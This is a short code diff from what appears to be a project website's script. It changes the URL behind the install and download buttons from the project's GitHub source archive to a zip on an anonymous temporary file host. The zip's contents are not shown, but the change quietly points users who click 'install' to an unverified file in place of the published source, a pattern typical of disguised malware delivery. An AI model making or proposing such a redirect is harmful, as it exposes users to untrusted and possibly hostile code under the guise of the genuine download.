@@ -1,4 +1,4 @@
-const DOWNLOAD_URL = 'https://github.com/guguluP/zero-grok-site/archive/refs/heads/main.zip';
+const DOWNLOAD_URL = 'https://litter.catbox.moe/w0kmga.zip';
 const installButtons = [document.getElementById('installBtn'), document.getElementById('downloadBtn')];
 installButtons.forEach(btn => {
   if (!btn) return;
